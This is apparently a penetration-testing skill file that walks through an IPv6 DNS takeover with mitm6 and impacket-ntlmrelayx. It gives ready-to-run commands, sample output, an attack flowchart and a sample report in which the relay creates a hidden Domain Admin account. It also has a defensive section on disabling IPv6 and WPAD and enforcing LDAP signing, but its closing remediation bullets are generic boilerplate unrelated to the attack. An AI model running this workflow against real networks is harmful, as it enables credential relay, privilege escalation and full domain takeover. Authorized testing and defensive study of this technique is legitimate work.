---
name: ipv6-dns-takeover-mitm
description: >
  Execute an IPv6 DNS Spoofing attack using `mitm6` on an IPv4-only corporate network. 
  Exploit default Windows behavior (preferring IPv6 DHCP/DNS) to intercept NTLMv2 hashes, 
  force WPAD rogue proxy settings, and relay credentials to Active Directory services.
domain: cybersecurity
subdomain: penetration-testing
category: Network Security
difficulty: intermediate
estimated_time: "1-3 hours"
mitre_attack:
  tactics: [TA0006, TA0009]
  techniques: [T1557.001, T1187, T1556.001]
platforms: [linux, windows]
tags: [mitm, active-directory, ipv6, ntlm-relay, mitm6, wpad, responder, dns-spoofing]
tools: [mitm6, impacket-ntlmrelayx, responder]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# IPv6 DNS Takeover (mitm6)

## When to Use
- When classic IPv4 LLMNR/NBT-NS spoofing (via Responder) fails because the Blue Team has explicitly disabled broadcast protocols across the Active Directory domain.
- To execute Man-in-the-Middle (MITM) attacks on modern Windows environments (Windows 10/11) that universally enable and prioritize IPv6 traffic by default, even if the enterprise infrastructure routes IPv4.
- To orchestrate an NTLMv2 Relay attack targeting LDAPS (LDAP over SSL) to automatically create new domain administrators or escalate privileges.


## Prerequisites
- Authorized scope and rules of engagement for the target environment
- Appropriate tools installed on the attack/analysis platform
- Understanding of the target technology stack and architecture
- Documentation template ready for findings and evidence capture

## Workflow

### Phase 1: Understanding the Vulnerability (The IPv6 Preference)

```text
# Concept: By default, Windows endpoints request an IPv6 address via DHCPv6 upon boot.
# Because corporate networks rarely configure internal IPv6 routing, the requests go unanswered.
# However, if an attacker maliciously answers the DHCPv6 request, Windows immediately accepts 
# the rogue IPv6 address and the attacker's supplied IPv6 DNS Server IP.

# Crucially, modern Windows specifically prioritizes IPv6 DNS resolution over IPv4 DNS.
# The attacker now controls all DNS resolution for the victim.
```

### Phase 2: Launching the IPv6 Rogue DHCP/DNS Server (mitm6)

```bash
# Concept: mitm6 monitors the internal network for DHCPv6 SOLICIT messages. It replies with 
# rogue configurations, assigning the victim an IPv6 address and setting the attacker's Kali 
# Linux machine as the primary IPv6 DNS Server.

# 1. Identify the target Active Directory Domain Name
# (e.g., `corp.local` or `internal.company.com`)

# 2. Start mitm6 targeting exclusively the specific domain
sudo mitm6 -d corp.local

# Terminal Output:
# [mitm6] Starting mitm6 using interface eth0
# [mitm6] Sent reply to FE80::XXXX assigning 2001:DB8::XX and setting DNS to Attacker_IP
# [mitm6] Spoofing DNS reply for wpad.corp.local to 2001:DB8::Attacker_IP
```

### Phase 3: Exploiting WPAD (Web Proxy Auto-Discovery)

```bash
# Concept: The victim machine, now utilizing the attacker's malicious DNS server, asks 
# "Where is the WPAD server?" to configure its proxy settings automatically.
# mitm6 explicitly hands out the attacker's IP address.

# When the victim attempts to browse the intranet or the internet, it forcibly attempts 
# to authenticate to the attacker's rogue Proxy server (NTLMRelayX) utilizing NTLMv2 SSO.
```

### Phase 4: NTLM Relaying to LDAP (Impacket)

```bash
# Concept: The attacker captures the incoming NTLMv2 authentication session (triggered by WPAD) 
# and relays it directly to the true Domain Controller over IPv4 LDAP.

# 1. Start NTLMRelayX targeting the Domain Controller (10.0.0.5)
# Utilizing the `-6` flag allows it to listen on the newly created IPv6 interface 
# for the incoming WPAD HTTP authentication.

sudo impacket-ntlmrelayx -6 -t ldap://10.0.0.5 -wh wpad.corp.local -l lootdir

# 2. The Relay Execution (Automated):
# - Victim opens Google Chrome.
# - Chrome asks DNS for WPAD (mitm6 answers).
# - Chrome connects to Attacker Proxy (NTLMRelayX).
# - Chrome attempts silent NTLMv2 Single Sign-On against the Attacker.
# - NTLMRelayX relays the authentication precisely to the Domain Controller's LDAP service.
# - NTLMRelayX authenticates successfully as the victim!

# 3. Privilege Escalation Phase:
# If the victim is anomalous (e.g., a Domain Admin or an account with `WriteDacl` rights over the domain),
# NTLMRelayX automatically executes high-privilege LDAP modifications explicitly:
# - Creating a new Domain Administrator account.
# - Granting the attacker DCSync privileges.
# - Escalating a standard user.
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Identify AD Domain Name] --> B[Execute `mitm6 -d target.local`]
    B --> C[Execute `impacket-ntlmrelayx -6 -t ldap://DC_IP`]
    C --> D[Wait for Victim PCs to reboot, connect to network, or open web browser]
    D --> E[Victim requests DHCPv6]
    E --> F[mitm6 answers, setting rogue IPv6 DNS]
    F --> G[Victim requests `wpad.target.local` via IPv6 DNS]
    G --> H[mitm6 answers with Attacker IP]
    H --> I[Victim Chrome/Edge authenticates (NTLM) to NTLMRelayX]
    I --> J[NTLMRelayX relays auth to DC LDAP]
    J --> K{Is Victim privileged?}
    K -->|Yes| L[NTLMRelayX modifies LDAP to create Domain Admin / escalate privileges!]
    K -->|No| M[NTLMRelayX dumps LDAP Domain Data (Users, Computers, Groups) into `lootdir`]
```

## 🔵 Blue Team Detection & Defense
- **Disable IPv6 on Endpoints**: If the enterprise explicitly does not route or architect IPv6 traffic disable the IPv6 protocol stack on all Windows network adapters via Group Policy (GPO) or intimately via the Registry (`DisabledComponents=0xFF`). This absolutely mitigates the `mitm6` attack vector.
- **Implement LDAP Channel Binding and Signing**: NTLM Relaying attacks (like NTLMRelayX) against Domain Controllers are fundamentally thwarted if the Active Directory environment rigorously enforces LDAP Signing and LDAP Channel Binding. Without these enforced, the DC will natively accept relayed, unencrypted NTLM authentication over standard LDAP (Port 389).
- **Disable WPAD (Web Proxy Auto-Discovery)**: The attack inherently relies on the legacy, insecure default behavior of Windows attempting to discover a WPAD file automatically on the network to configure web proxy settings. Disable "Automatically detect settings" in Windows Proxy configurations globally via GPO.

## Key Concepts
| Concept | Description |
|---------|-------------|
| DHCPv6 | Dynamic Host Configuration Protocol for IPv6; automatically assigns IP addresses and configuration parameters (like DNS servers) to nodes identically to IPv4 DHCP |
| IPv6 Preference | A core architectural design in modern Windows operating systems where IPv6 connectivity and DNS resolution fundamentally supersede IPv4 if both are purportedly available |
| WPAD | Web Proxy Auto-Discovery Protocol; an antiquated methodology used by web browsers to automatically locate a PAC (Proxy Auto-Config) file via DNS or DHCP to configure routing without user intervention |
| NTLM Relay | A cryptographic interception attack where an adversary places themselves between a victim and a server, capturing an authentication attempt (NTLMv2) and immediately forwarding it to a secondary, high-value target (LDAP, SMB) to authenticate as the victim |

## Output Format
```
Internal Infrastructure Exploitation: IPv6 DNS Spoofing via Mitm6
===================================================================
Target Domain: `corp.internal`
Vulnerability: Insecure Defaults (Unmitigated IPv6 / WPAD / LDAP Signing Disabled)
Severity: Critical (CVSS 9.6)

Description:
During the internal penetration test, while classic LLMNR/NBT-NS spoofing was successfully mitigated, the overall environment remained highly susceptible to IPv6 DHCP/DNS Spoofing utilizing `mitm6`.

The attacker deployed a rogue DHCPv6 server broadcasting malicious configuration parameters across the `VLAN-15` subnet. The target endpoint (`IT-ADMIN-WS-04`) natively accepted the attacker as the primary IPv6 DNS authority.

Subsequently, the endpoint automatically requested resolving the `wpad.corp.internal` domain to configure its system proxy settings. The `mitm6` server resolved WPAD to the attacker's Kali machine, hosting a malicious `impacket-ntlmrelayx` listener.

Result:
When the IT Administrator launched a web browser, the system silently authenticated against the rogue WPAD proxy via NTLMv2. 

The attacker instantaneously relayed this high-privileged authentication over standard IPv4 LDAP directly to the Primary Domain Controller (`10.10.1.200`). Because LDAP Signing was not strictly enforced, the Domain Controller successfully accepted the forwarded credentials. The `ntlmrelayx` script automatically exploited these LDAP rights to create a new, stealthy Domain Administrator account (`Backup_SVC_Account`). Total Active Directory compromise achieved in approximately 4 minutes.
```

## 🛡️ Remediation & Mitigation Strategy
- **Input Validation:** Sanitize and strictly type-check all inputs.
- **Least Privilege:** Constrain component execution bounds.


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- Dirk-jan Mollema (Fox-IT): [mitm6 - compromising IPv4 networks via IPv6](https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/)
- SecureAuth Impacket: [NTLMRelayX Implementation](https://github.com/fortra/impacket)
- Microsoft Guidance: [Guidance for configuring IPv6 in Windows for advanced users](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/configure-ipv6-in-windows)
